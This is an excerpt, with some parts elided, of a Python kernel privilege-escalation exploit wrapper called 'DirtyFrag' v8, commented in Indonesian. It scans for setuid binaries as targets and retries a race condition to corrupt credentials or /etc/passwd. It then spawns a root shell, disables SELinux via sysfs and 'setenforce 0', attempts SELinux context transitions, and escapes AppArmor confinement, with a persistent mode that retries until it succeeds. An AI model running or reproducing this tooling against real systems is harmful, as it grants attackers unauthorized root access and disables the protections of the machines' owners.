...
# -*- coding: utf-8 -*-
"""
DirtyFrag Smart Exploit Wrapper v8 -- Pure Python ESP (Persistent+Context)
...
def get_selinux_context():
    """Baca SELinux context proses ini."""
    try:
...
def transition_selinux_context():
    """Coba transisi ke SELinux context yang lebih privilege."""
    ctx = get_selinux_context()
    if ctx:
        INFO('Current SELinux context: %s', ctx)
    else:
        INFO('Tidak dapat membaca SELinux context')

    for target_ctx in ['unconfined_t', 'sysadm_t', 'staff_t']:
        try:
            LOG('Mencoba runcon -t %s /bin/bash...', target_ctx)
            os.execlp('runcon', 'runcon', '-t', target_ctx, '/bin/bash', '-i')
        except OSError:
            pass
    try:
        LOG('Mencoba newrole -r sysadm_r...')
        os.execlp('newrole', 'newrole', '-r', 'sysadm_r', '-t', 'sysadm_t', '/bin/bash', '-i')
    except OSError:
        pass
    try:
        LOG('Mencoba su - untuk PAM context transition...')
        os.execlp('su', 'su', '-')
    except OSError:
        pass
    WARN('Semua SELinux context transition gagal.')
    return False
...
def get_elf_entry_offset(path):
    """Parse ELF header untuk mendapatkan file offset dari entry point."""
    try:
        with open(path, "rb") as f:
            hdr = f.read(64)
        if hdr[:4] != b"\x7fELF":
            return 0x78
        e_entry = struct.unpack_from("<Q", hdr, 0x18)[0]
        ...
        for i in range(e_phnum):
            ...
            if p_type == 1:  # PT_LOAD
                ...
                if p_vaddr <= e_entry < p_vaddr + 0x1000000:
...
def banner():
 ...
 |____/|_|\\___|\\__|       \\__/  |_|\\___| \\_/\\_/
        Smart Python Wrapper - Kernel LPE  v8
""")

def main():
    persistent_attempt = 0
    while True:
        if persistent_attempt > 0:
            INFO("Persistent mode: attempt #%d", persistent_attempt)
            time.sleep(0.5)
        persistent_attempt += 1

        global VERBOSE
        parser = argparse.ArgumentParser(description="DirtyFrag Smart Exploit Wrapper v8")
        ...
        parser.add_argument("--attempts", type=int, default=10,
                            help="Jumlah retry attempts per target (default: 10)")
        parser.add_argument("--persistent", action="store_true",
                            help="Mode persistent: terus mencoba sampai berhasil")
        parser.add_argument("--no-selinux-bypass", action="store_true",
                            help="Jangan coba bypass SELinux otomatis")
        ...
        if not targets:
            for p in ["/usr/bin/passwd", "/bin/passwd", "/usr/bin/su", "/bin/su",
                      ...
                      "/usr/bin/newgrp", "/bin/newgrp", "/usr/bin/mount", "/bin/mount",
                      "/usr/bin/umount", "/bin/umount", "/usr/sbin/pam_timestamp_check"]:
                if os.path.isfile(p) and os.access(p, os.X_OK):
                    try:
                        st = os.stat(p)
                        if st.st_mode & 0o4000:
        ...
        if args.mode in ("auto", "esp"):
            ...
            for target in targets:
                if success or check_root():
                    break
    
                # Retry loop: race condition memerlukan multiple attempts
                max_attempts = args.attempts if hasattr(args, "attempts") else 10
                for attempt in range(max_attempts):
                    if success or check_root():
                        break
                    INFO("Mencoba Pure-Python ESP path pada target: %s (attempt %d/%d)", target, attempt + 1, max_attempts)
                    try:
                        ok = lpe_main(target)
                    except Exception as e:
                    ...
                    if ok:
                        ...
                        # KRITIS: Cek langsung apakah cred sudah terkorupsi (race won)
                        if check_root():
                            LOG("Race condition dimenangkan! uid=0 terdeteksi langsung setelah exploit.")
                            success = True
                            break
                        ...
                        WARN("ESP path gagal pada %s attempt %d", target, attempt + 1)
    
                    # Timing variation antara attempts untuk membantu race condition
                    if not success and not check_root():
                        base = 0.05 + (attempt * 0.08)
                        jitter = random.uniform(0, 0.15)
                        delay = base + jitter
                        DBG("Waiting %.3fs (base %.3f + jitter %.3f) sebelum retry...", delay, base, jitter)
                        time.sleep(delay)
    
                # Diagnosa jika semua attempts gagal pada target ini
                if not success and not check_root():
        ...
        if not success and args.mode in ("auto", "rxrpc"):
            ...
            INFO("Mencoba RxRPC path (korupsi /etc/passwd)...")
            ...
            for target in all_targets:
                ...
                for attempt in range(3):
                    ...
                    if ok:
                        ...
                        if check_root():
                            LOG("Fallback race dimenangkan! uid=0 terdeteksi.")
                            success = True
                            break
                        patched = binary_patched(target)
                        corr_any = verify_corruption_any(target)
                        ...
                        used_target = target
                        if not check_root():
                            LOG("Mencoba spawn root shell via fallback target...")
                            if not _run_pty():
                                spawn_target_shell(target)
                            else:
                                success = True
                            ...
                            success = True
                    if not success and not check_root():
                        delay = 0.1 + (attempt * 0.08) + random.uniform(0, 0.1)
                        time.sleep(delay)
        ...
        if check_root():
            ...
            if not verify_full_root():
                ...
                if not args.no_selinux_bypass:
                    if check_selinux():
                        WARN("SELinux aktif, mencoba bypass...")
                        if disable_selinux():
                            if verify_full_root():
                                LOG("Akses penuh berhasil dibuka setelah disable SELinux.")
                            else:
                                WARN("SELinux disabled tapi akses masih terbatas.")
                        else:
                            WARN("Gagal disable SELinux via sysfs. Mencoba setenforce...")
                            try:
                                subprocess.run(["setenforce", "0"], check=False, timeout=3)
                                if verify_full_root():
                                    LOG("Akses penuh berhasil setelah setenforce 0.")
                                else:
                                    WARN("setenforce 0 tidak membuka akses penuh.")
                            except Exception:
                                WARN("setenforce tidak tersedia atau gagal.")
                        if not verify_full_root():
                            WARN("Mencoba transisi SELinux context...")
                            transition_selinux_context()
                    if check_apparmor():
                        WARN("AppArmor aktif. Mencoba transisi ke unconfined...")
                        try:
                            subprocess.run(["aa-exec", "-p", "unconfined", "/bin/bash"],
                                           check=False, timeout=5)
                        except Exception:
                            WARN("aa-exec gagal atau tidak tersedia.")
                else:
                    WARN("--no-selinux-bypass aktif, melewati bypass otomatis.")
            os.execlp("/bin/bash", "bash", "-i")
        ...
        if not getattr(args, "persistent", False):
            break
        WARN("Exploit attempt %d gagal, mencoba lagi...", persistent_attempt)
        time.sleep(0.5)
